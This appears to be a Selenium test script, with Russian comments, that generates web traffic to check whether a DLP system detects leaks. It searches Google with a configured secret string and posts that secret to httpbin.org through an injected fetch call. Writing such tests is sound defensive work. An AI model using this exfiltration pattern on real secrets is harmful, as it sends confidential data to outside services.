import time
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager
import config

def log(msg): print(f"[QUICK-TEST] {msg}")

def run_standalone():
    log(">>> ЗАПУСК АВТОНОМНОГО ТЕСТА (Internet Only) <<<")
    
    # Настройка браузера
    opts = Options()
    opts.add_argument("--start-maximized")
    # opts.add_argument("--headless") # Раскомментируй, если не хочешь видеть окно
    opts.add_argument("--ignore-certificate-errors") # Игнорировать ошибки SSL (важно для DLP MITM)
    
    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=opts)
    
    try:
        # 1. Посещение HTTP сайтов (Чистый текст, порт 80)
        # DLP должна увидеть полный URL в открытом виде
        http_sites = [
            "http://kremlin.ru",       # Сайт Президента РФ
            "http://neverssl.com",     # Специальный сайт для тестов HTTP
            "http://example.com"       # Стандартная заглушка
        ]
        
        log("1. Проверка HTTP сайтов (Unencrypted)...")
        for url in http_sites:
            log(f"   -> Открываем: {url}")
            driver.get(url)
            time.sleep(5) # Ждем прогрузки, чтобы DLP успела перехватить контент

        # 2. Поисковые запросы (HTTPS)
        log("2. Генерация поисковых запросов (Google)...")
        driver.get(f"https://www.google.com/search?q={config.SECRET_DATA}")
        time.sleep(3)
        
        # 3. Мессенджеры (Web Versions)
        # Просто заходим, чтобы DLP увидел SSL handshake с доменами мессенджеров
        messengers = [
            ("WhatsApp Web", "https://web.whatsapp.com"),
            ("Telegram Web", "https://web.telegram.org"),
            ("Skype Online", "https://web.skype.com")
        ]
        
        for name, url in messengers:
            log(f"3. Проверка детекции приложения: {name}...")
            driver.get(url)
            time.sleep(5) 
            
        # 4. HTTP POST (Утечка данных в публичный bin)
        log("4. Попытка отправки данных через HTTP POST...")
        # httpbin.org - публичный сервис для тестов
        driver.execute_script(f"""
            fetch('https://httpbin.org/post', {{
                method: 'POST',
                body: JSON.stringify({{ secret: '{config.SECRET_DATA}' }})
            }});
        """)
        time.sleep(2)
        log("   [OK] Данные отправлены.")

    except Exception as e:
        log(f"[ERROR] {e}")
    finally:
        driver.quit()
        log("Автономный тест завершен.")

if __name__ == "__main__":
    run_standalone()
